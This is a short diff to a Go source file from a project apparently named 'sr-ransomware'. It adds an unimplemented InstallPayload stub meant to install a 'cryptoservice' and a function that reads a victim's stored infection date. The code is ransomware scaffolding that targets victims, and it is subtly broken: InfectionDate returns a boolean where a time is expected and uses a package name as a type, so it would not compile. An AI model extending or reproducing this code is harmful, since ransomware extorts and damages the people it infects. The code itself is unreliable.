@@ -20,6 +20,23 @@ import (
     "github.com/sug0/sr-ransomware/go/net/ratelimit"
 )
 
+func InstallPayload() error {
+    // TODO: extract cryptoservice and install it as service
+    return nil
+}
+
+func InfectionDate() (time.Time, error) {
+    // register infection date
+    f, err := os.Open(victimInfectionDate)
+    if err != nil {
+        return false, errors.Wrap(pkg, "failed to open infection date file", err)
+    }
+    defer f.Close()
+    var t time
+    err = gob.NewDecoder(bufio.NewReader(f)).Decode(&t)
+    return t, errors.WrapIfNotNil(pkg, "failed to decode time", err)
+}
+
 // Checks if the victim should be infected.
 func Infect() (bool, error) {
     if _, err := os.Stat(victimInfectionDate); err == nil {
